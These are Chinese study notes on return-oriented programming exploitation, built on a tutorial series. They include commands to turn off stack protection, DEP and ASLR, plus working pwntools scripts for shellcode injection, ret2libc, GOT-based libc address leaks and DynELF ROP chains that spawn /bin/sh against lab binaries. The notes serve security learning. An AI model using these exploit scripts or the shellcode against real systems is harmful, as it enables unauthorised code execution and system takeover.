<!-- TOC -->

- [1. 概述](#1-概述)
    - [1.1. 来源](#11-来源)
    - [1.2. 程序流劫持（Control Flow Hijack）](#12-程序流劫持control-flow-hijack)
    - [1.3. 系统防御](#13-系统防御)
    - [1.4. ROP的概念](#14-rop的概念)
- [2. 准备工作](#2-准备工作)
    - [2.1. 设置coredump](#21-设置coredump)
    - [2.2. 解除安全措施的方法](#22-解除安全措施的方法)
    - [2.3. SOCAT](#23-socat)
    - [2.4. 其它](#24-其它)
- [3. X86](#3-x86)
- [4. 开启DEP](#4-开启dep)
    - [4.1. ret2libc](#41-ret2libc)
    - [4.2. EXP](#42-exp)
- [5. 开启ASLR+DEP（关闭PIE）](#5-开启aslrdep关闭pie)
    - [5.1. 通过偏移定位](#51-通过偏移定位)
    - [5.2. 获取libc.so中某些函数的内存地址](#52-获取libcso中某些函数的内存地址)
    - [5.3. EXP](#53-exp)
- [6. 无目标服务器so库](#6-无目标服务器so库)
    - [6.1. Memory Leak & DynELF](#61-memory-leak--dynelf)
    - [6.2. EXP](#62-exp)
- [7. x64与x86的区别](#7-x64与x86的区别)
- [8. 寻找gadgets](#8-寻找gadgets)
- [9. 工具](#9-工具)
    - [9.1. gadgets工具](#91-gadgets工具)
        - [9.1.1. ROPgadget](#911-ropgadget)
    - [9.2. pwntools](#92-pwntools)
    - [9.3. EDB](#93-edb)

<!-- /TOC -->
# 1. 概述
## 1.1. 来源
本笔记来源于蒸米的《一步一步学ROP》系列文章。代码见：https://github.com/zhengmin1989/ROP_STEP_BY_STEP。
## 1.2. 程序流劫持（Control Flow Hijack）
通过程序流劫持（如栈溢出，格式化字符串攻击和堆溢出），攻击者可以控制PC指针从而执行目标代码。
## 1.3. 系统防御
为了应对程序流劫持，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。
## 1.4. ROP的概念
ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术，可以用来绕过现代操作系统的各种通用防御。
# 2. 准备工作
## 2.1. 设置coredump
可以防止GDB调试环境下地址与实际运行环境下地址不同的情况。
```bash
# 开启coredump
ulimit -c unlimited
sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'
# 调试coredump文件，第一个xxx为可执行文件名，第二个xxx为coredump文件名
gdb xxx /tmp/core.xxx
```
## 2.2. 解除安全措施的方法
* GCC编译选项：`-fno-stack-protector`，用于关闭栈保护
* GCC编译选项：`-z execstack`，用于关闭DEP
* shell指令：`echo 0 > /proc/sys/kernel/randomize_va_space`，用于关闭ASLR，设置为2为启用ASLR
* GCC编译选项：`-no-pie`，用于关闭PIE（程序基址版本的ASLR）
## 2.3. SOCAT
`socat TCP4-LISTEN:10001,fork EXEC:./level1`，SOCAT可以将目标程序作为一个服务绑定到服务器的某个端口上
## 2.4. 其它
* GCC编译选项：`-m32`，编译成32位程序
# 3. X86
```python
# encoding:utf-8
from pwn import *
p = process('./level1') 
# 返回地址，通过调试确定栈中地址
ret = 0xbffff290
# 通过自编译生成shellcode，也可以通过msf生成
# shellcode最后的功能相当于execve ("/bin/sh") 
# xor ecx, ecx      ;清零ecx
# mul ecx           ;ecx*eax，清零eax和edx
# push ecx          ;压栈0
# push 0x68732f2f   ;; hs//
# push 0x6e69622f   ;; nib/
# mov ebx, esp      ;ebx指向/bin//sh，为参数
# mov al, 11        ;系统调用
# int 0x80
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"
# 对ret进行编码，将地址转换成内存中的二进制存储形式；p32(ret) == struct.pack("<I",ret) 
# 这里溢出长度为140，具体可以利用pattern.py来确定溢出长度
payload = shellcode + 'A' * (140 - len(shellcode)) + p32(ret)
p.send(payload)  #发送payload
p.interactive()  #开启交互shell
```
# 4. 开启DEP
## 4.1. ret2libc
通过GDB加载了程序之后，在主函数下断，断下后利用print和find指令找到`system()`函数（`print system`）和`/bin/sh`字符串（可以从`__libc_start_main`函数地址开始找，`find 0xb7e393f0, +2200000, "/bin/sh"`，这里0xb7e393f0是通过print指令确定的`__libc_start_main`函数的 地址，2200000为寻找范围，找到后可以通过`x/s 0xb7f81ff8`来验证）的地址，由于未开启ASLR，该地址不变，然后通过执行`system("/bin/sh")`来获取shell。
## 4.2. EXP
```python
from pwn import *
p = process('./level2')
ret = 0xdeadbeef
systemaddr=0xb7e5f460
binshaddr=0xb7f81ff8
payload =  'A'*140 + p32(systemaddr) + p32(ret) + p32(binshaddr)
p.send(payload)
p.interactive()
```
# 5. 开启ASLR+DEP（关闭PIE）
## 5.1. 通过偏移定位
先获取到libc.so中某些函数的内存地址，然后通过so文件（使用ldd命令可以查看目标程序调用的so库在哪里）和偏移计算出`system`函数和`/bin/sh`字符串在内存中的地址。之后将程序返回到漏洞函数，再次进行溢出，通过`system`函数和`/bin/sh`字符串劫持程序流。
## 5.2. 获取libc.so中某些函数的内存地址
由于程序本身在内存中的地址固定，我们可以获取到libc.so中某些函数在plt表和got表中的地址。利用objdump可以查看可以利用的plt函数（`objdump -d -j .plt level2`）和函数对应的got表（`objdump -R level2`）。例如，可以利用`write`函数可以把`write`函数在内存中的地址打印出来。
## 5.3. EXP
```python
# encoding:utf-8
from pwn import *
# 读取两个文件
libc = ELF('libc.so')
elf = ELF('level2')
p = process('./level2')
# 获取plt和got地址
plt_write = elf.symbols['write']
print 'plt_write= ' + hex(plt_write)
got_write = elf.got['write']
print 'got_write= ' + hex(got_write)
# 通过GDB获取漏洞函数地址
vulfun_addr = 0x8049172
print 'vulfun= ' + hex(vulfun_addr)
# 第一次溢出，获取write函数地址
payload1 = 'A' * 140 + p32(plt_write) + p32(vulfun_addr) + p32(1) + p32(got_write) + p32(4)
print "\n###sending payload1 ...###"
p.send(payload1)
print "\n###receving write() addr...###"
write_addr = u32(p.recv(4))
print 'write_addr=' + hex(write_addr)
# 计算偏移
print "\n###calculating system() addr and \"/bin/sh\" addr...###"
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
print 'system_addr= ' + hex(system_addr)
binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
print 'binsh_addr= ' + hex(binsh_addr)
# 第二次溢出，进行程序流劫持
payload2 = 'A'*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)
print "\n###sending payload2 ...###"
p.send(payload2)
# 开启交互式shell
p.interactive()
```
# 6. 无目标服务器so库
## 6.1. Memory Leak & DynELF
在获取不到目标服务器上的libc.so的情况下，需要通过Memory Leak（内存泄露）来搜索内存寻找`system`函数的地址，pwntools提供了DynELF模块来进行内存搜索（具体实现见EXP）。由于DynELF模块不能够搜索字符串，另外再通过`read`函数将`/bin/sh`字符串写入到程序的.bss段（用于保存全局变量，地址固定，并且可以读可写，通过`readelf -S level2`可以获取到bss段的地址）。在执行完`read`函数之后，接着调用`system("/bin/sh")`。由于`read`函数有三个参数，所以我们需要一个`pop pop pop ret`的gadget用来保证栈平衡（用`objdump -d level2`即可找到）。
## 6.2. EXP
```python
# encoding:utf-8
from pwn import *
# 读取文件
elf = ELF('./level2')
plt_write = elf.symbols['write']
plt_read = elf.symbols['read']
vulfun_addr = 0x8049172
# 泄露函数
def leak(address):
    payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    print "%#x => %s" % (address, (data or '').encode('hex'))
    return data
# 启动程序
p = process('./level2')
# 获取函数地址
d = DynELF(leak, elf=ELF('./level2'))
system_addr = d.lookup('system', 'libc')
print "system_addr=" + hex(system_addr)
# 另外两个地址，bss段和pop pop pop ret的gadget的地址
bss_addr = 0x804c020
pppr = 0x8049269
payload2 = 'a'*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8)
# 这里插入一个write函数刷新缓冲区
payload2 += p32(plt_write) + p32(pppr) + p32(1) + p32(bss_addr) + p32(8)
payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
print "\n###sending payload2 ...###"
p.send(payload2)
p.send("/bin/sh\0")
p.interactive()
```
# 7. x64与x86的区别
* 内存地址范围由32位变成了64位，但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常
* 函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上
# 8. 寻找gadgets
# 9. 工具
## 9.1. gadgets工具
* objdump（可用于寻找简单gadgets）：kali Linux自带
* ROPEME: https://github.com/packz/ropeme
* Ropper: https://github.com/sashs/Ropper
* ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master
* rp++: https://github.com/0vercl0k/rp
### 9.1.1. ROPgadget
Kali Linux自带该款工具：
* ROPgadget --binary libc.so.6 --only "pop|ret" | grep rdi
## 9.2. pwntools
python库，可以极大的简化pwn的工作量。
* 寻找bin文件中的字符串：next(ELF('libc.so.6').search('/bin/sh'))
* 获取bin文件中函数地址：ELF('libc.so.6').symbols['system']
* 寻找bin文件中plt表和got表中对应函数的地址：ELF('libc.so.6').plt['system']；ELF('libc.so.6').got['system']
## 9.3. EDB
EDB调试器，Linux下的GUI调试器，对标OD。